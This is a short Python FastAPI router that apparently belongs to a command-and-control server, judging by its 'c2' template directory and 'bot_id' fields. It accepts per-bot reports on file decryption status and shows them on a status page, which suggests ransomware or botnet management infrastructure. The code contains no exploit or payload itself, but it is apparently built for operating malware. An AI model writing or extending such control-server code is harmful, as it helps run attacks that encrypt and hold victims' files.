from fastapi import APIRouter, Request
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel

router = APIRouter()
templates = Jinja2Templates(directory="c2/templates")

decryption_logs = []

class DecryptReport(BaseModel):
    bot_id: str
    filename: str
    status: str

@router.post("/api/decrypt/report")
async def report_decryption(data: DecryptReport):
    log_entry = {
        "bot_id": data.bot_id,
        "filename": data.filename,
        "status": data.status
    }
    decryption_logs.append(log_entry)
    return {"message": "Report logged"}

@router.get("/decrypt/status")
async def decrypt_status_page(request: Request):
    return templates.TemplateResponse("decrypt_status.html", {
        "request": request,
        "logs": decryption_logs
    })
